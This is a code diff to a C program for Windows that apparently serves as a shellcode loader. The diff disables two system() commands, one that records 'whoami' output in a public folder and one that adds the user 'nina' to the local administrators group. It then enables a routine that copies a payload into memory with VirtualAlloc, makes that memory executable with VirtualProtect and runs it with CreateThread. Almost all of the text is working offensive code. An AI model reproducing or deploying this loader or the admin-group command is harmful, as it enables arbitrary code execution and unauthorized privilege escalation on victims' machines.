@@ -16,20 +16,20 @@ unsigned int payload_len = sizeof(payload);
 
 int Run() 
 { 
-    system("whoami > c:\\users\\public\\service.txt");
-    system("net localgroup administrators nina /add");
-    return 0;
-
-    // void* exec;
-    // BOOL rv;
-    // HANDLE th;
-    // DWORD oldprotect = 0;
-    // exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    // RtlMoveMemory(exec, payload, payload_len);
-    // rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
-    // th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
-    // WaitForSingleObject(th, -1);
+    // system("whoami > c:\\users\\public\\service.txt");
+    // system("net localgroup administrators nina /add");
     // return 0;
+
+    void* exec;
+    BOOL rv;
+    HANDLE th;
+    DWORD oldprotect = 0;
+    exec = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    RtlMoveMemory(exec, payload, payload_len);
+    rv = VirtualProtect(exec, payload_len, PAGE_EXECUTE_READ, &oldprotect);
+    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
+    WaitForSingleObject(th, -1);
+    return 0;
 } 
 
 int main() 
